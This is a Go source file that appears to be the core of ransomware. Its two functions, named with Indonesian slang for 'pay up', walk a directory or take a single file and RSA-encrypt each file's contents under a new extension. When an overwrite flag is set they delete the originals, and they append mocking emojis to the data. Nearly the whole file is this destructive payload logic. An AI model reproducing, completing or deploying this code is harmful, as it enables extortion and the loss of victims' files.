package src

import (
	"crypto/rsa"
	"crypto/sha256"
	"errors"
	"fmt"
	"github.com/gossl/rsam"
	"os"
	"path/filepath"
	"strings"
)

func MakeDirBayarCoek(dirPath string, extension string, overwrite bool, privateKey *rsa.PrivateKey) error {
	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			if strings.HasSuffix(path, "."+extension) {
				return errors.New(path + "\nHAS BEEN ENCRYPTED")
			}
			file, err := os.ReadFile(path)
			if err != nil {
				return err
			}
			file = append(file, []byte("🤣🤣🤣"+path)...)
			split := strings.Split(info.Name(), ".")
			filename := strings.Join(split[:len(split)-1], "")
			dirPath := strings.Split(path, info.Name())[0]
			parsedPath := dirPath + filename + "." + extension
			ciphertext, err := rsam.EncryptWithPrivateKey(file, privateKey, sha256.New())
			if err != nil {
				return err
			}
			err = os.WriteFile(parsedPath, ciphertext, 0777)
			if overwrite {
				err = os.Remove(path)
			}
			if err != nil {
				return err
			}
		} else {
			return nil
		}
		return nil
	})
	if err != nil {
		fmt.Printf("ERROR: %v\n", err)
		return err
	}
	fmt.Println(fmt.Sprintf("SUCCESS: %s ENCRYPTED", dirPath))
	return nil
}

func MakeSingleBayarCoek(filePath string, extension string, overwrite bool, privateKey *rsa.PrivateKey) error {
	info, err := os.Lstat(filePath)
	if err != nil {
		fmt.Printf("ERROR: %v\n", err)
		return err
	}
	if info.IsDir() {
		fmt.Printf("ERROR: %s\n%s\n", filePath, "FILEPATH IS DIRECTORY")
		return errors.New(fmt.Sprintf("ERROR: %s\n%s\n", filePath, "FILEPATH IS DIRECTORY"))
	}
	if strings.HasSuffix(filePath, "."+extension) {
		fmt.Printf("ERROR: %s\n%s\n", filePath, "INVALID ENCRYPTED FILE")
		return errors.New(fmt.Sprintf("ERROR: %s\n%s\n", filePath, "INVALID ENCRYPTED FILE"))
	}
	file, err := os.ReadFile(filePath)
	if err != nil {
		fmt.Printf("ERROR: %v\n", err)
		return err
	}
	if strings.HasSuffix(filePath, "."+extension) {
		fmt.Printf("ERROR: %s\n%s\n", filePath, "HAS BEEN ENCRYPTED")
		return errors.New(fmt.Sprintf("ERROR: %s\n%s\n", filePath, "HAS BEEN ENCRYPTED"))
	}
	file, err = os.ReadFile(filePath)
	if err != nil {
		fmt.Printf("ERROR: %v\n", err)
		return err
	}
	file = append(file, []byte("🤣🤣🤣"+filePath)...)
	split := strings.Split(info.Name(), ".")
	filename := strings.Join(split[:len(split)-1], "")
	dirPath := strings.Split(filePath, info.Name())[0]
	parsedPath := dirPath + filename + "." + extension
	ciphertext, err := rsam.EncryptWithPrivateKey(file, privateKey, sha256.New())
	if err != nil {
		fmt.Printf("ERROR: %v\n", err)
		return err
	}
	err = os.WriteFile(parsedPath, ciphertext, 0777)
	if overwrite {
		err = os.Remove(filePath)
	}
	if err != nil {
		fmt.Printf("ERROR: %v\n", err)
		return err
	}
	fmt.Println(fmt.Sprintf("SUCCESS: %s ENCRYPTED", filePath))
	return nil
}
